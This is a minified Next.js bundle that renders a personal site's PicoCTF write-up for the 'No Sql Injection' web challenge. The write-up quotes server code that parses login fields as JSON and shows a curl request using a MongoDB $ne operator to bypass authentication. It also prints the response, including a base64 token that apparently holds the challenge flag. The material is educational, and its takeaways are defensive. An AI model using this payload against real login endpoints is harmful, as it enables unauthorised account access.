(globalThis.TURBOPACK||(globalThis.TURBOPACK=[])).push(["object"==typeof document?document.currentScript:void 0,77509,e=>{"use strict";var a=e.i(43476),r=e.i(22016);let o=`
  :root {
    --bg:        #0d1e2b;
    --surface:   #162838;
    --border:    #2a6080;
    --accent:    #40f0ff;
    --accent2:   #ff6680;
    --accent3:   #70ff50;
    --text:      #e8f4fb;
    --muted:     #e8f4fb;
    --code-bg:   #0a1822;
    --glow:      0 0 16px #40f0ff88;
  }

  .page-wrap *, .page-wrap *::before, .page-wrap *::after { box-sizing: border-box; margin: 0; padding: 0; }

  /* Navbar override specifically for writeup pages to make it fit the theme */
  nav {
    background: var(--bg) !important;
    border-color: var(--border) !important;
  }
  nav ul {
    gap: 2.5rem !important; /* more separated */
  }
  nav ul li {
    margin-left: 0 !important;
  }
  nav .ThemeToggle, nav button {
    display: none !important;
  }
  
  body {
    background: var(--bg);
    color: var(--text);
    font-family: 'Rajdhani', sans-serif;
    font-size: 1.2rem;
    line-height: 1.8;
    min-height: 100vh;
    overflow-x: hidden;
  }

  body::before {
    content: '';
    position: fixed; inset: 0;
    background: repeating-linear-gradient(
      to bottom,
      transparent 0px, transparent 3px,
      rgba(0,0,0,0.08) 3px, rgba(0,0,0,0.08) 4px
    );
    pointer-events: none;
    z-index: 999;
  }

  body::after {
    content: '';
    position: fixed; inset: 0;
    background-image:
      linear-gradient(rgba(0,229,255,0.08) 1px, transparent 1px),
      linear-gradient(90deg, rgba(0,229,255,0.08) 1px, transparent 1px);
    background-size: 40px 40px;
    pointer-events: none;
    z-index: 0;
  }

  .page-wrap {
    position: relative;
    z-index: 1;
    max-width: 860px;
    margin: 0 auto;
    padding: 3rem 1.5rem 6rem;
  }

  .back-link {
    display: inline-block;
    margin-bottom: 2rem;
    color: var(--muted);
    text-decoration: none;
    font-size: 1rem;
    transition: color 0.2s ease;
  }
  .back-link:hover {
    color: var(--accent);
    text-decoration: underline;
  }

  .page-wrap header {
    border-bottom: 1px solid var(--border);
    padding-bottom: 2rem;
    margin-bottom: 3rem;
    animation: fadeDown 0.6s ease both;
  }

  .ctf-label {
    font-family: 'Share Tech Mono', monospace;
    font-size: 0.95rem;
    letter-spacing: 0.25em;
    color: var(--accent);
    text-transform: uppercase;
    margin-bottom: 0.5rem;
  }

  .page-wrap header h1 {
    font-family: 'Orbitron', monospace;
    font-size: clamp(2rem, 5vw, 3.4rem);
    font-weight: 900;
    color: #fff;
    text-shadow: var(--glow);
    line-height: 1.1;
    margin-bottom: 1.2rem;
  }

  .meta-grid {
    display: flex;
    flex-wrap: wrap;
    gap: 0.6rem 1.4rem;
    font-family: 'Share Tech Mono', monospace;
    font-size: 1rem;
  }

  .meta-item {
    display: flex;
    align-items: center;
    gap: 0.4rem;
    color: var(--muted);
  }

  .meta-item span.val {
    color: var(--accent);
  }

  .badge {
    display: inline-block;
    padding: 0.15em 0.7em;
    border-radius: 2px;
    font-family: 'Share Tech Mono', monospace;
    font-size: 0.95rem;
    letter-spacing: 0.08em;
    border: 1px solid;
  }
  .badge.diff-easy   { color: var(--accent3);  border-color: var(--accent3);  background: rgba(57,255,20,0.07); }
  .badge.diff-medium { color: #ffcc00;          border-color: #ffcc00;         background: rgba(255,204,0,0.07); }
  .badge.diff-hard   { color: var(--accent2);   border-color: var(--accent2);  background: rgba(255,63,91,0.07); }

  section {
    margin-bottom: 2.8rem;
    animation: fadeUp 0.5s ease both;
  }

  section:nth-child(1) { animation-delay: 0.1s; }
  section:nth-child(2) { animation-delay: 0.2s; }
  section:nth-child(3) { animation-delay: 0.3s; }
  section:nth-child(4) { animation-delay: 0.4s; }
  section:nth-child(5) { animation-delay: 0.5s; }

  .section-header {
    display: flex;
    align-items: center;
    gap: 0.8rem;
    margin-bottom: 1.2rem;
  }

  .section-num {
    font-family: 'Share Tech Mono', monospace;
    font-size: 0.9rem;
    color: var(--accent);
    letter-spacing: 0.1em;
    opacity: 0.7;
  }

  h2 {
    font-family: 'Orbitron', monospace;
    font-size: 1.25rem;
    font-weight: 700;
    color: var(--accent);
    text-transform: uppercase;
    letter-spacing: 0.12em;
  }

  .section-line {
    flex: 1;
    height: 1px;
    background: linear-gradient(to right, var(--border), transparent);
  }

  .card {
    background: var(--surface);
    border: 1px solid var(--border);
    border-left: 3px solid var(--accent);
    padding: 1.2rem 1.4rem;
    margin-bottom: 1rem;
    border-radius: 0 4px 4px 0;
  }

  .card h3 {
    font-family: 'Orbitron', monospace;
    font-size: 1.05rem;
    font-weight: 700;
    color: #fff;
    margin-bottom: 0.5rem;
  }

  .card ul {
    list-style: none;
    padding: 0;
  }

  .card ul li {
    padding: 0.2rem 0 0.2rem 1.2rem;
    position: relative;
    color: var(--text);
  }

  .card ul li::before {
    content: '›';
    position: absolute;
    left: 0;
    color: var(--accent);
  }

  .step {
    background: var(--surface);
    border: 1px solid var(--border);
    border-radius: 4px;
    margin-bottom: 1.2rem;
    overflow: hidden;
    transition: border-color 0.2s;
  }

  .step:hover { border-color: var(--accent); }

  .step-header {
    display: flex;
    align-items: center;
    gap: 0.8rem;
    padding: 0.8rem 1.2rem;
    border-bottom: 1px solid var(--border);
    background: rgba(0,229,255,0.03);
  }

  .step-num {
    font-family: 'Share Tech Mono', monospace;
    font-size: 0.9rem;
    color: var(--muted);
    min-width: 2.5rem;
  }

  .step-label {
    font-family: 'Share Tech Mono', monospace;
    font-size: 1rem;
    color: #fff;
    flex: 1;
  }

  .step-body {
    padding: 1rem 1.2rem;
  }

  .io-row {
    display: grid;
    grid-template-columns: 60px 1fr;
    gap: 0.4rem 0.8rem;
    margin-bottom: 0.8rem;
    align-items: start;
  }

  .io-label {
    font-family: 'Share Tech Mono', monospace;
    font-size: 0.9rem;
    letter-spacing: 0.1em;
    padding-top: 0.1rem;
  }

  .io-label.in  { color: var(--accent);  }
  .io-label.out { color: var(--accent3); }

  code {
    font-family: 'Share Tech Mono', monospace;
    font-size: 1rem;
    background: var(--code-bg);
    border: 1px solid var(--border);
    padding: 0.5rem 0.8rem;
    display: block;
    border-radius: 2px;
    color: var(--accent);
    word-break: break-all;
    white-space: pre-wrap;
  }

  code.output {
    color: var(--accent3);
  }

  .reason {
    font-size: 1.05rem;
    color: var(--muted);
    margin-top: 0.6rem;
    padding-top: 0.6rem;
    border-top: 1px dashed var(--border);
  }

  .reason strong {
    color: var(--text);
    font-weight: 600;
  }

  .prose {
    font-size: 1.1rem;
    color: var(--text);
    line-height: 1.9;
    margin-bottom: 1rem;
    white-space: pre-wrap;
  }

  .notice-box {
    border: 1px solid var(--border);
    padding: 1.2rem 1.4rem;
    margin-bottom: 1.2rem;
    border-radius: 4px;
    color: var(--text);
    background: transparent;
    font-size: 1.0rem;
    white-space: pre-wrap;
    font-family: 'Share Tech Mono', monospace;
  }

  .flag-box {
    background: var(--code-bg);
    border: 1px solid var(--accent3);
    border-radius: 4px;
    padding: 1.4rem 1.8rem;
    text-align: center;
    box-shadow: 0 0 24px rgba(57,255,20,0.12), inset 0 0 30px rgba(57,255,20,0.04);
  }

  .flag-label {
    font-family: 'Share Tech Mono', monospace;
    font-size: 0.7rem;
    letter-spacing: 0.25em;
    color: var(--muted);
    text-transform: uppercase;
    margin-bottom: 0.6rem;
  }

  .flag-value {
    font-family: 'Share Tech Mono', monospace;
    font-size: 1.05rem;
    color: var(--accent3);
    text-shadow: 0 0 10px rgba(57,255,20,0.5);
    word-break: break-all;
  }

  .tags {
    display: flex;
    flex-wrap: wrap;
    gap: 0.5rem;
    margin-top: 0.8rem;
  }

  .tag {
    font-family: 'Share Tech Mono', monospace;
    font-size: 0.9rem;
    letter-spacing: 0.1em;
    padding: 0.2em 0.7em;
    border: 1px solid var(--border);
    color: var(--muted);
    border-radius: 2px;
    background: rgba(255,255,255,0.03);
  }

  footer {
    margin-top: 4rem;
    padding-top: 1.5rem;
    border-top: 1px solid var(--border);
    font-family: 'Share Tech Mono', monospace;
    font-size: 0.9rem;
    color: var(--muted);
    display: flex;
    justify-content: space-between;
    flex-wrap: wrap;
    gap: 0.5rem;
  }

  @keyframes fadeDown {
    from { opacity: 0; transform: translateY(-16px); }
    to   { opacity: 1; transform: translateY(0); }
  }

  @keyframes fadeUp {
    from { opacity: 0; transform: translateY(12px); }
    to   { opacity: 1; transform: translateY(0); }
  }

  @media (max-width: 600px) {
    .io-row { grid-template-columns: 1fr; }
    .io-label { margin-bottom: 0.2rem; }
  }
`;function t({data:e}){let t=`diff-${e.difficulty}`;return(0,a.jsxs)(a.Fragment,{children:[(0,a.jsx)("style",{children:o}),(0,a.jsx)("link",{href:"https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&family=Rajdhani:wght@300;400;600&display=swap",rel:"stylesheet"}),(0,a.jsxs)("div",{className:"page-wrap",children:[(0,a.jsx)(r.default,{href:"/projects/cybersecurity",className:"back-link",children:"← Back to Cybersecurity Projects"}),(0,a.jsxs)("header",{children:[(0,a.jsx)("div",{className:"ctf-label",children:"PicoCTF — Write-Up"}),(0,a.jsx)("h1",{children:e.title}),(0,a.jsxs)("div",{className:"meta-grid",children:[(0,a.jsxs)("div",{className:"meta-item",children:[(0,a.jsx)("span",{children:"Category:"}),(0,a.jsx)("span",{className:"val",children:e.category})]}),(0,a.jsxs)("div",{className:"meta-item",children:[(0,a.jsx)("span",{children:"Points:"}),(0,a.jsx)("span",{className:"val",children:e.points})]}),(0,a.jsxs)("div",{className:"meta-item",children:[(0,a.jsx)("span",{children:"Author:"}),(0,a.jsx)("span",{className:"val",children:e.author})]}),(0,a.jsxs)("div",{className:"meta-item",children:[(0,a.jsx)("span",{children:"Difficulty:"}),(0,a.jsx)("span",{className:`badge ${t}`,children:e.difficulty.charAt(0).toUpperCase()+e.difficulty.slice(1)})]})]}),(0,a.jsx)("div",{className:"tags",children:e.tags.map(e=>(0,a.jsxs)("span",{className:"tag",children:["#",e]},e))})]}),e.sections.map((e,r)=>(0,a.jsxs)("section",{children:[(0,a.jsxs)("div",{className:"section-header",children:[(0,a.jsx)("span",{className:"section-num",children:String(r+1).padStart(2,"0")}),(0,a.jsx)("h2",{children:e.title}),(0,a.jsx)("div",{className:"section-line"})]}),e.prose&&(0,a.jsx)("p",{className:"prose",children:e.prose}),e.notice&&(0,a.jsx)("div",{className:"notice-box",children:e.notice}),e.cards?.map((e,r)=>(0,a.jsxs)("div",{className:"card",children:[(0,a.jsx)("h3",{children:e.title}),(0,a.jsx)("ul",{children:e.items.map((e,r)=>(0,a.jsx)("li",{dangerouslySetInnerHTML:{__html:e}},r))})]},r)),e.steps?.map((e,r)=>(0,a.jsxs)("div",{className:"step",children:[(0,a.jsxs)("div",{className:"step-header",children:[(0,a.jsxs)("span",{className:"step-num",children:["STEP ",e.number]}),(0,a.jsx)("span",{className:"step-label",children:e.label})]}),(0,a.jsxs)("div",{className:"step-body",children:[e.prose&&(0,a.jsx)(a.Fragment,{children:e.prose.split("\n\n").map((e,r)=>(0,a.jsx)("p",{className:"prose",children:e},r))}),e.notice&&(0,a.jsx)("div",{className:"notice-box",children:e.notice}),e.input&&(0,a.jsxs)("div",{className:"io-row",children:[(0,a.jsx)("span",{className:"io-label in",children:"INPUT"}),(0,a.jsx)("code",{children:e.input})]}),e.output&&(0,a.jsxs)("div",{className:"io-row",children:[(0,a.jsx)("span",{className:"io-label out",children:"OUTPUT"}),(0,a.jsx)("code",{className:"output",children:e.output})]}),e.reason&&(0,a.jsx)("p",{className:"reason",dangerouslySetInnerHTML:{__html:e.reason}})]})]},r))]},r)),e.flag&&(0,a.jsxs)("section",{children:[(0,a.jsxs)("div",{className:"section-header",children:[(0,a.jsx)("span",{className:"section-num",children:"FF"}),(0,a.jsx)("h2",{children:"Flag"}),(0,a.jsx)("div",{className:"section-line"})]}),(0,a.jsxs)("div",{className:"flag-box",children:[(0,a.jsx)("div",{className:"flag-label",children:"Captured Flag"}),(0,a.jsx)("div",{className:"flag-value",children:"[REDACTED]"})]})]}),(0,a.jsxs)("footer",{children:[(0,a.jsxs)("span",{children:[e.author," — PicoCTF Write-Up"]}),(0,a.jsx)("span",{children:"All steps performed in a legal CTF environment."})]})]})]})}e.s(["default",()=>t])},8336,e=>{"use strict";var a=e.i(43476),r=e.i(77509);function o(){let e={title:"No Sql Injection",category:"Web Exploitation",points:"n/a",author:"Kelvin Creighton",difficulty:"medium",tags:["curl","nosqli","web","mongodb","base64"],flag:"picoCTF{...}",sections:[{title:"Research",cards:[{title:"What is NoSQL Injection?",items:["It occurs when user input is unsafely embedded into database queries in a NoSQL database (like MongoDB).","Unlike traditional SQL Injection, NoSQL injection often leverages data structures (like JSON objects) and operators (e.g., `$ne`, `$gt`)."]},{title:"Dangerous Patterns in Node.js/MongoDB",items:["Using objects directly in queries: `User.find(req.body)`","Using `$where` with user input.","Using eval-like constructs."]}]},{title:"Information Gathering",prose:"The challenge gives us access to a web application using Express, Body-Parser, and Mongoose for a MongoDB backend. The goal is to bypass the login logic and obtain the flag.",steps:[{number:"01",label:"Analyzing `server.js`",prose:'Looking at the provided source code, we identified the key components used: Express, Mongoose, and a local MongoMemoryServer instance.\n\nWe also found an initial user created: email: "picoplayer355@picoctf.org". The password is randomly generated but stored in plaintext in the DB, which is a bad practice.'},{number:"02",label:"Identifying the Vulnerability",input:`const user = await User.findOne({
  email: email.startsWith("{") && email.endsWith("}") ? JSON.parse(email) : email,
  password: password.startsWith("{") && password.endsWith("}") ? JSON.parse(password) : password,
});`,reason:"<strong>Reason:</strong> The code attempts to parse the `email` and `password` fields as JSON if they start and end with braces. This is a severe vulnerability as it allows us to supply MongoDB query operators (like `$ne`) as the password instead of a string, leading to a NoSQL Injection."}]},{title:"Creating the Payload",prose:"Since we know the target email (`picoplayer355@picoctf.org`) and the application processes JSON inputs into MongoDB queries, we can construct a request that bypasses the password check.",steps:[{number:"01",label:"Bypassing Authentication with `$ne`",input:'curl -s -X POST http://[target]/login -H \'Content-Type: application/json\' -d \'{"email":"picoplayer355@picoctf.org","password":"{\\"$ne\\":null}"}\'',output:'{"success":true,"email":"picoplayer355@picoctf.org","token":"cGljb0NURntqQmhEMnk3WG9OelB2XzFZeFM5RXc1cUwwdUk2cGFzcWxfaW5qZWN0aW9uXzc4NGU0MGU4fQ==","firstName":"pico","lastName":"player"}',reason:'<strong>Reason:</strong> The payload `{\\"$ne\\":null}` translates to "not equal to null". Since every user has a password, this condition is true. The database finds the user matching the email and a non-null password, granting us access.'},{number:"02",label:"Decoding the Token",prose:"The response contains a `token` field that looks like base64. Decoding it yields the flag."}]},{title:"Key Takeaways",cards:[{title:"",items:["Never parse user input directly into query objects without strict validation or sanitization.","Storing passwords in plaintext (even if randomly generated) violates basic security principles. Always use strong hashing algorithms like bcrypt.","Understanding how the backend framework (like Mongoose) handles complex objects is crucial for identifying NoSQL injections."]}]}]};return(0,a.jsx)(r.default,{data:e})}e.s(["default",()=>o])}]);